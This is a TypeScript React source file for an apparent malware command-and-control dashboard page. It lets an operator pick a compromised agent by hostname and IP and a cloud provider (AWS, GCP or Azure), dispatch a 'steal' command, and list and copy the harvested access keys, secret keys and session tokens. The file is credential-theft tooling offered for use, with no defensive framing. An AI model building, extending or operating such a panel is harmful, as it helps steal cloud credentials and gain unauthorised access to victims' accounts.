"use client";

import { useEffect, useState, useCallback } from "react";
import { api } from "@/lib/api";
import { EmptyState, PageHeader, Spinner } from "@/components/UI";
import { useAgentList } from "@/lib/hooks/useAgentList";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Skeleton } from "@/components/ui/skeleton";
import { toast } from "sonner";
import { Cloud, CloudUpload, Copy, List } from "lucide-react";
import { useI18n } from "@/lib/i18n";

import type { Agent } from "@/types/agent";


interface CloudCred {
  id: number;
  agent_id: string;
  provider: string;
  access_key_id: string;
  secret_key: string;
  session_token: string;
  region: string;
  account_id: string;
  account_name: string;
  permissions: string;
  raw_output: string;
}

interface CloudResultsResponse {
  results: CloudCred[];
}

export default function CloudPage() {
  const { t } = useI18n();
  const { agents, loading: agentsLoading, refresh: refreshAgents } = useAgentList();
  const [selectedAgent, setSelectedAgent] = useState("");
  const [provider, setProvider] = useState("aws");
  const [stealing, setStealing] = useState(false);
  const [results, setResults] = useState<CloudCred[]>([]);
  const [selectedAgentResults, setSelectedAgentResults] = useState("");

  useEffect(() => { refreshAgents(); }, [refreshAgents]);

  const loadResults = useCallback(async (agentId: string) => {
    if (!agentId) return;
    try {
      const data: CloudResultsResponse = await api.json<CloudResultsResponse>(`/cloud/${agentId}/results`);
      setResults(data.results || []);
    } catch { toast.error(t("cloud.load_results_failed")); }
  }, []);

  useEffect(() => {
    if (selectedAgentResults) loadResults(selectedAgentResults);
  }, [selectedAgentResults, loadResults]);

  const handleSteal = async () => {
    if (!selectedAgent) return;
    setStealing(true);
    try {
      await api.postJson("/cloud/steal", { agent_id: selectedAgent, provider });
    } catch { toast.error(t("cloud.steal_failed")); }
    setStealing(false);
  };

  const getAgentId = (a: Agent) => a.id || "";
  const getHostname = (a: Agent) => a.hostname || "";
  const getIP = (a: Agent) => a.ip || "";
  return (
    <div className="max-w-[80rem] mx-auto pb-12 md:pb-0 animate-fade-slide-up">
      <PageHeader title={t("cloud.title")} subtitle={t("cloud.subtitle")} />

      <Card className="p-4 sm:p-5 mb-6">
        <div className="flex items-center gap-x-3 mb-5">
          <div className="w-10 h-10 bg-sky-100 dark:bg-sky-900/30 rounded-xl flex items-center justify-center">
            <Cloud className="w-4 h-4" />
          </div>
          <div>
            <div className="text-sm font-semibold text-foreground">{t("cloud.dispatch_title")}</div>
            <div className="text-xs text-muted-foreground">{t("cloud.dispatch_desc")}</div>
          </div>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
          <div>
            <span className="block text-xs font-semibold text-muted-foreground mb-1.5">{t("cloud.target_agent")}</span>
            {agentsLoading ? (
              <Skeleton className="h-10 rounded-xl" />
            ) : (
            <Select value={selectedAgent} onValueChange={(v) => setSelectedAgent(v ?? "")}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder={t("cloud.select_agent")} />
              </SelectTrigger>
              <SelectContent>
                {agents.map(a => {
                  const id = getAgentId(a);
                  return <SelectItem key={id} value={String(id)}>{getHostname(a)} ({getIP(a)})</SelectItem>;
                })}
              </SelectContent>
            </Select>
            )}
          </div>
          <div>
            <span className="block text-xs font-semibold text-muted-foreground mb-1.5">{t("cloud.provider")}</span>
            <Select value={provider} onValueChange={(v) => setProvider(v ?? "")}>
              <SelectTrigger className="w-full">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="aws">AWS</SelectItem>
                <SelectItem value="gcp">GCP</SelectItem>
                <SelectItem value="azure">Azure</SelectItem>
                <SelectItem value="all">{t("cloud.all_providers")}</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <div className="flex items-end">
            <Button onClick={handleSteal} disabled={stealing || !selectedAgent}>
              {stealing ? <Spinner size="xs" /> : <CloudUpload className="w-4 h-4" />}
              <span>{stealing ? t("cloud.dispatching") : t("cloud.steal_btn")}</span>
            </Button>
          </div>
        </div>
      </Card>

      <Card className="p-4 sm:p-5 mb-6">
        <div className="flex items-center gap-x-3 mb-5">
          <div className="w-10 h-10 bg-indigo-100 dark:bg-indigo-900/30 rounded-xl flex items-center justify-center">
            <List className="w-4 h-4" />
          </div>
          <div>
            <div className="text-sm font-semibold text-foreground">{t("cloud.stolen_title")}</div>
            <div className="text-xs text-muted-foreground">{t("cloud.stolen_desc")}</div>
          </div>
        </div>
        <div className="mb-4">
          <span className="block text-xs font-semibold text-muted-foreground mb-1.5">{t("cloud.filter_agent")}</span>
          <Select value={selectedAgentResults} onValueChange={(v) => setSelectedAgentResults(v ?? "")}>
            <SelectTrigger className="w-full md:w-64">
              <SelectValue placeholder={t("cloud.select_agent")} />
            </SelectTrigger>
            <SelectContent>
              {agents.map(a => {
                const id = getAgentId(a);
                return <SelectItem key={id} value={String(id)}>{getHostname(a)} ({getIP(a)})</SelectItem>;
              })}
            </SelectContent>
          </Select>
        </div>
        {results.length > 0 ? (
          <Table>
            <TableHeader>
              <TableRow className="bg-muted">
                <TableHead className="text-xs uppercase tracking-wider font-semibold">{t("cloud.col_provider")}</TableHead>
                <TableHead className="text-xs uppercase tracking-wider font-semibold">{t("cloud.col_access_key")}</TableHead>
                <TableHead className="text-xs uppercase tracking-wider font-semibold">{t("cloud.col_secret_key")}</TableHead>
                <TableHead className="text-xs uppercase tracking-wider font-semibold">{t("cloud.col_actions")}</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {results.map((cred) => (
                <TableRow key={cred.id}>
                  <TableCell>
                    <span className={`text-[10px] px-2 py-0.5 rounded-full font-medium ${
                      cred.provider === "aws" ? "bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-400" :
                      cred.provider === "gcp" ? "bg-primary/10 text-primary" :
                      cred.provider === "azure" ? "bg-sky-100 text-sky-700 dark:bg-sky-900/30 dark:text-sky-400" :
                      "bg-secondary text-muted-foreground"
                    }`}>
                      {cred.provider.toUpperCase()}
                    </span>
                  </TableCell>
                  <TableCell className="font-mono text-xs text-muted-foreground">
                    {cred.access_key_id || "(raw)"}
                  </TableCell>
                  <TableCell className="font-mono text-xs text-muted-foreground max-w-[200px] truncate">
                    {cred.secret_key ? cred.secret_key.substring(0, 40) + "..." : "-"}
                  </TableCell>
                  <TableCell>
                    <Button variant="outline" size="sm" onClick={() => {
                      const text = `Provider: ${cred.provider}\nAccess Key: ${cred.access_key_id || "N/A"}\nSecret Key: ${cred.secret_key || "N/A"}\n`;
                      navigator.clipboard.writeText(text);
                      toast.success(t("cloud.copied"));
                    }}>
                      <Copy className="w-4 h-4" />{t("cloud.copy")}
                    </Button>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
          ) : (
            <div className="text-center py-16 sm:py-20 text-muted-foreground">
              <EmptyState icon={Cloud} title={t("cloud.empty_title")} message={t("cloud.empty_message")} />
            </div>
          )}
      </Card>
    </div>
  );
}

